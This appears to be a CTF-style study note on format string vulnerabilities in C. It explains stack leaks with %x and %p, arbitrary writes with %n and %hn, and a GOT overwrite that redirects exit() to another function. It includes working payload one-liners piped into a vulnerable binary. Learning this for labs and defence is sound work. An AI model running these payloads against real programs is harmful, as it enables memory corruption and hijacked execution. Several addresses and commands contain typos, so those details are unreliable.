# Format string

 Format string exploit vulnerabilities in programs by abusing the '%x' power, reading and writing int the stack with printf() and sprintf() functions. It can leak sensitive information and even take control of the function.

### Table of Content

- [Before Exploit](#before-exploit)
- [Read the stack](#read-the-stack)
- [CyberChef helps you read in the stack](#website-helping-you-reading-the-stack)
- [OverWrite data](#overwrite-data)
- [write complex value](#write-complex-value)
- [Code execution redirect](#code-execution-redirect)
- [Documentation](#docum)

## Before exploit

To run this exploit you need find in the code a printf function family, without quote.

Example: ```printf(user_buffer);```

instead of ```printf("%s", user_buffer)```

## Read the stack 

imagine this code:

```c
  char local_20c [520];

  fgets(local_20c,0x200,stdin);
  printf(local_20c);
```

If you don't provide arg, and if you pass for example %x to prinf, it will read and print hexa from the next address on the stack.

You can print the entire stack. And read data.

![img](/pwn/img/error_printf.svg)
[website docu](https://axcheron.github.io/exploit-101-format-strings/)

### Read 64 bits stack

To read 8 bytes data, you can use ```%p``` or ```%lld```.

### Website helping you reading the stack

- [CyberChef](https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',8,true)From_Hex('Auto'))

## OverWrite Data 

You can overwrite data with printf and `%n`.

From the man: `The number of characters already written is stored in the integer pointed to by the argument of type int *. No argument is converted.`

```c
printf("AAAA%n", &(int)a);
```

Will write, 4 in a.

4 because, it takes the value of 'AAAA' which is 4 bytes.

### OverWrite data with pointer to it

#### theory

When call to printf(), if there is no argument, you can try find through the stack, the pointer you want to overwrite.

```c
char *overwrite = "AAAA%34$n";
printf(overwrite);
```

Gonna overwrite 4 in the 4th address in the stack.

But if you don't know where is the pointer, or maybe it isn't on the stack, you can write in the buffer the address you wan't overwrite, and %n to exact addres of the start of the buffer.

#### Exploit

- find the start of the buffer:

```c
char *overwrite = "AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.";
printf(overwrite);

AAAA00000200.f7e26620.00000000.41414141.78383025.3830252e.30252e78.252e7838.2e783830.78383025.3830252e.30252e78.252e7838.
```

By printing the stack, we can see that the pointer to the buffer is a the 4th address in the stack. so if we write in the buffer an address, and point to it with $x we can overwrite data int it with $n.

```c
char *overwrite = "\x8c\x98\x04\x08%4$n";
printf(overwrite);
```

So this overwrite 4 at the address 0x08049888c.

If you want to print a special value inside the pointer, you can give it a padding using this ```%<size>x```

```c
char *overwrite = "\x8c\x98\x04\x08%60x%4$n";
printf(overwrite);
```

This will print 60 byte + 4 (address) into pointer.

## Write complex value

### Problem

If we want print complex value at specific address, imagine try print 0x01025544 at address 0x08049810.

Lets suppose the program is 32bit little endian.

0x01025544 = 16930116 (in decimal) 

So we should print a large padding, and it could take to much time.

### Theory

There is a technique to print data in 2 byte with printf(): `%hn` (h for half).

So let's focus first 0x0000(2 bytes) store at the address 08049810 then last 0x0000 08049810 + 2, fill them with respectively 0x5544 and 0x0102 (little endian). 

### Exploit

To sum up : 

```py
0x0102 = 258(in decimal) -> 08049810 + 2 + 08049812
0x5544 = 21828(in decimal) -> 08049810
```

To adjust the padding, we can follow this rule : 

`padding = [The value we want] - [The bytes alredy wrote] = [The value to set].`

High order first cause the value is lower:

High order 258 - 8 = 250 (both addresses are 4 bytes)

Low order 21828 - 258 = 21570

So final exploit is : 

```py
python3 -c 'import sys; sys.stdout.buffer.write(b"\x10\x98\x04\x08" + b"\x12\x98\x04\x08" + b"%250x" + b"%13$hn" + b"%21570x" + b"%12$hn")' | ./vuln
```

- `b"\x10\x98\x04\x08"` is the first address.
- `b"\x12\x98\x04\x08"` is the second address.

so `%12$x` point to first address and `%13$x` to the second.

- `b"%250x"` is the first padding (remember 250 + 8 byte address = 258 = 0x102)
- `b"%13$hn"` we store 258 inside the second address because its little endian.
- `b"%21570x"` is the second padding (0x5544 - 0x102)
- `b"%12$hn"` is the first address, we store the value.

Bingo, `\x10\x98\x04\x08` point to 0x1025544 !


## Code execution redirect

There is two way to redirect the code execution.

- Overwrite return pointer in the stack by [writing complex value](#write-complex-value)
- Overwrite function call before return pointer

Lets say, exit() is call before return. So you can't overwrite return pointer.

### GOT Overwrite

Basically, when the program is executed, the GOT (Global Offset Table) is initialized for every external functions (like libc functions). By doing so, the executable will cache the memory address in the GOT, so that it doesn’t have to ask libc each time an external function is called.

The goal here will be to overwrite the address of exit() in the GOT with the address of vuln_func(). There are 4 steps here :

- Find the address of o()
- Find the address of exit() in GOT
- Find the offset of our string on the stack
- Write the proper exploit string

```bash
iobjdump -R ./level5 | grep exit                                                     
08049838 R_386_JUMP_SLOT   exit@GLIBC_2.0

objdump -t ./level5 | grep vuln_func
080484a4 g     F .text	0000001e              vuln_func
```

You have the pointer to overwrite (0x08049838) with the value to overwrite (0x080484a4).

You can [overwrite the data](#overwrite-data-with-pointer-to-it) by using [this techinique to write large data](#write-complex-value)

Example of payload :

```bash
cat <(python3 -c 'import sys; sys.stdout.buffer.write(b"\x38\x98\x04\x08" + b"\x3a\x98\x04\x08" + b"%2044x" + b"%5$hn" + b"%31904x" + b"%4$hn")') - | ./vuln
```

### Docum

- [Insane Tuto](https://axcheron.github.io/exploit-101-format-strings/)

---

[**:arrow_right_hook: Back PWN**](/pwn/pwn.md)
